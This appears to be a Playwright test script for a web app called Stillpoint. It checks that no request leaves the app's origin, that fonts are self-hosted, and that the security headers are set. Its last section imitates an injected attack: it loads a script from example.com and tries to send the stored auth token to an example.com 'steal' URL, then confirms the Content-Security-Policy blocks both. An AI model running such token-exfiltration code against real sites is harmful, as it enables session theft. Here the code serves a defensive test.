import { ACCOUNTS, PASSWORD, WEB, launch } from './browser.mjs';
import { reporter } from './report.mjs';

/**
 * What the app sends, and where.
 *
 * One rule, checked from the outside: **a browser running Stillpoint talks to
 * Stillpoint and to nothing else.** Not as a style preference — this is a
 * product about being upset, and a request to a third party carries the
 * visitor's IP and user-agent with it whatever the response body is. The
 * session screen is the worst place for one and the easiest place to acquire
 * one, because a font, an icon set or an analytics snippet is a single line
 * that nobody reads again.
 *
 * It found something real the first time it ran: the fonts were linked from
 * Google's CDN, so every page load reached them. They are served from
 * `public/fonts` now.
 *
 * The API itself is the one allowed destination besides the app's own origin,
 * and in development both are loopback.
 *
 * It also checks the headers that make that rule the browser's to enforce
 * rather than ours to hope for — and, more usefully, that the policy does not
 * break the app: every console message is watched for a Content-Security-Policy
 * violation, so a header too strict for a screen fails here instead of in front
 * of someone.
 */

const { ok, bad, fails, watchForThrows } = reporter('nothing leaves this origin');
watchForThrows();

/**
 * Loopback under any spelling, which is the app and the API locally.
 *
 * Returns false rather than throwing on anything that is not a URL. It is also
 * asked about CSP source tokens, and some of those — `ws:`, `data:`, `'self'` —
 * are not parseable URLs; a `TypeError` here would end the whole check with a
 * stack trace instead of a verdict, which is the wrong way for a security
 * check to fail.
 */
function ours(url) {
  try {
    const { hostname } = new URL(url);

    return hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1';
  } catch {
    return false;
  }
}

const browser = await launch();
const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });

/**
 * Every CSP violation the browser reports, from any screen this script visits.
 *
 * Through the `securitypolicyviolation` DOM event rather than by reading
 * console messages, and that is not a stylistic choice: the console wording is
 * the browser's own and it differs between builds. This check first read
 * "Refused to load the script …", passed locally, and failed in CI, where the
 * same Chromium family says "Loading the script … violates …" instead. The
 * event is specified, and it carries the blocked URI and the directive as
 * fields rather than as prose to be matched.
 *
 * `exposeFunction` plus `addInitScript` so the listener survives every
 * navigation — a `window` array would be cleared by the next page load, and
 * the screens this visits are the point.
 */
const violations = [];
await page.exposeFunction('stillpointCspViolation', (v) => {
  violations.push(v);
});
await page.addInitScript(() => {
  document.addEventListener('securitypolicyviolation', (event) => {
    // Both names. Browsers disagree about which of the two a `<script src>`
    // is reported under when only `script-src` is set — CI's said `script-src`
    // was "used as a fallback" for `script-src-elem` — so neither is relied on.
    void window.stillpointCspViolation({
      blockedURI: event.blockedURI,
      directive: event.effectiveDirective,
      violated: event.violatedDirective,
    });
  });
});

const elsewhere = new Map();
page.on('request', (request) => {
  const url = request.url();
  // `data:` and `blob:` never leave the page.
  if (url.startsWith('data:') || url.startsWith('blob:')) return;
  if (ours(url)) return;

  const origin = new URL(url).origin;
  elsewhere.set(origin, (elsewhere.get(origin) ?? 0) + 1);
});

// ---------------------------------------------------------------------------
console.log('\n1. Signed out');

for (const route of ['/welcome', '/welcome/consent', '/welcome/forgot']) {
  await page.goto(`${WEB}${route}`, { waitUntil: 'networkidle' });
}
ok('the public screens loaded');

// ---------------------------------------------------------------------------
console.log('\n2. Signed in, including a session');

await page.goto(`${WEB}/welcome`, { waitUntil: 'networkidle' });
await page.locator('input[type=email]').fill(ACCOUNTS.user);
await page.locator('input[type=password]').fill(PASSWORD);
await page.getByRole('button', { name: 'Sign in' }).click();
await page.waitForTimeout(2500);

for (const route of ['/app', '/app/journal', '/app/insights', '/app/settings', '/session']) {
  await page.goto(`${WEB}${route}`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(700);
}
ok('the app screens loaded');

// ---------------------------------------------------------------------------
console.log('\n3. Where the browser went');

if (elsewhere.size === 0) {
  ok('nothing left this origin');
} else {
  for (const [origin, count] of elsewhere) {
    bad(`a request left for ${origin}`, `${String(count)} of them`);
  }
}

// The fonts are the thing that was wrong, so they are checked by name as well
// as by the rule above — a regression here would most likely arrive as a
// `next/font/google` import that looks entirely reasonable in a diff.
const html = await page.goto(`${WEB}/welcome`).then((r) => r?.text());
if (html !== undefined && /fonts\.(googleapis|gstatic)\.com/.test(html)) {
  bad('the document still links Google Fonts');
} else {
  ok('the document links no webfont CDN');
}

// ---------------------------------------------------------------------------
console.log("\n4. The headers that make it the browser's rule, not ours");

const response = await page.goto(`${WEB}/welcome`, { waitUntil: 'networkidle' });
const headers = response?.headers() ?? {};

const csp = headers['content-security-policy'];
if (typeof csp === 'string' && csp.includes("default-src 'self'")) {
  ok('a Content-Security-Policy is served');
} else {
  bad('a Content-Security-Policy is served', String(csp));
}

// The directive that decides whether a stolen token can be sent anywhere. A
// wildcard here would make the rest of the policy decorative.
const connect = /connect-src ([^;]*)/.exec(csp ?? '')?.[1]?.trim() ?? '';
const destinations = connect.split(/\s+/).filter(Boolean);
const foreign = destinations.filter((d) => d !== "'self'" && !ours(d));
if (destinations.length > 0 && foreign.length === 0) {
  ok(`connect-src allows only this app and its API (${connect})`);
} else {
  bad(
    'connect-src allows only this app and its API',
    destinations.length === 0 ? `no connect-src in: ${csp ?? '(no header)'}` : foreign.join(' '),
  );
}

for (const [header, expected] of [
  ['x-content-type-options', 'nosniff'],
  ['x-frame-options', 'DENY'],
  ['referrer-policy', 'no-referrer'],
]) {
  if (headers[header] === expected) ok(`${header}: ${expected}`);
  else bad(`${header}: ${expected}`, String(headers[header]));
}

// The microphone is off because `UserEar` is unbound and every session is
// typed. If a listener is ever bound this has to change, and it should be a
// deliberate change rather than one nobody noticed.
if (/microphone=\(\)/.test(headers['permissions-policy'] ?? '')) {
  ok('the microphone is denied, as the unbound listener implies');
} else {
  bad('the microphone is denied', String(headers['permissions-policy']));
}

if (violations.length === 0) {
  ok('no screen tripped the policy');
} else {
  for (const v of violations.slice(0, 5))
    bad('a screen tripped the policy', `${v.directive ?? v.violated} blocked ${v.blockedURI}`);
}

// ---------------------------------------------------------------------------
console.log('\n5. The policy against the attack it is for');

// The token lives in `localStorage`, which any script on the page can read —
// `apps/web/src/lib/api.ts` says so at the top. The policy does not change
// that; what it takes away is the second half, which is getting the token out.
// So this does what an injected payload would do, from inside the real page,
// and asserts the browser refuses both halves.
//
// It runs last because it deliberately trips the policy, which the section
// above asserts nothing else does.
const before = violations.length;
const exfiltrated = await page.evaluate(async () => {
  const script = document.createElement('script');
  script.src = 'https://example.com/payload.js';
  document.head.appendChild(script);

  try {
    await fetch(
      `https://example.com/steal?t=${String(window.localStorage.getItem('stillpoint.token.v1'))}`,
    );
    return true;
  } catch {
    return false;
  }
});
await page.waitForTimeout(1200);

const refused = violations.slice(before);
const blocked = (...names) =>
  refused.some(
    (v) =>
      v.blockedURI.startsWith('https://example.com') &&
      (names.includes(v.directive) || names.includes(v.violated)),
  );
const seen = refused.map((v) => `${v.directive ?? v.violated}:${v.blockedURI}`).join(' | ');

if (!exfiltrated && blocked('connect-src')) {
  ok('the token cannot be sent to another origin');
} else {
  bad(
    'the token cannot be sent to another origin',
    exfiltrated ? 'the fetch succeeded' : seen || 'no connect-src violation reported',
  );
}

// `script-src-elem` is what a `<script src>` actually falls under; the policy
// sets only `script-src`, which browsers use as its fallback, and they differ
// on which name they then report. Either is the same refusal.
if (blocked('script-src-elem', 'script-src')) {
  ok('a script from another origin does not load');
} else {
  bad('a script from another origin does not load', seen || 'no violation reported');
}

const faces = await page.evaluate(() =>
  [...document.fonts].map((f) => ({ family: f.family, status: f.status })),
);
const loaded = faces.filter((f) => f.status === 'loaded').map((f) => f.family);
if (loaded.includes('Newsreader') && loaded.includes('Hanken Grotesk')) {
  ok('both families actually loaded, from here');
} else {
  bad('the self-hosted fonts did not load', JSON.stringify(faces));
}

await browser.close();

console.log(
  fails.length === 0 ? '\nALL PASSED' : `\n${String(fails.length)} FAILED: ${fails.join(', ')}`,
);
process.exit(fails.length === 0 ? 0 : 1);
